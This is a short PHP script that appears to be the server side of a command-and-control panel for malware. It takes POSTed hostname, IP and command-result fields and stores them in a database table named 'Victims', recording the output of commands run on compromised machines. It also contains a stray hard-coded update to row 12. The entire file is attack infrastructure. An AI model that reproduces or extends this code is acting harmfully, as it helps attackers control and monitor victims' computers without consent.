<?php
include 'conn.php';

//upadte the command result in sql server
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["result"])) {
    $testQuery = $mysql->prepare("update Victims set commandresult='NO' WHERE id=12");
    $testQuery->execute();
    $takeResultsQuery = $mysql->prepare("update Victims set commandresult=? where hostname=? and ipaddress=?");
    $takeResultsQuery->bind_param("sss", $_POST["result"], $_POST["hostname"], $_POST["ip"]);
    $takeResultsQuery->execute();
}

?>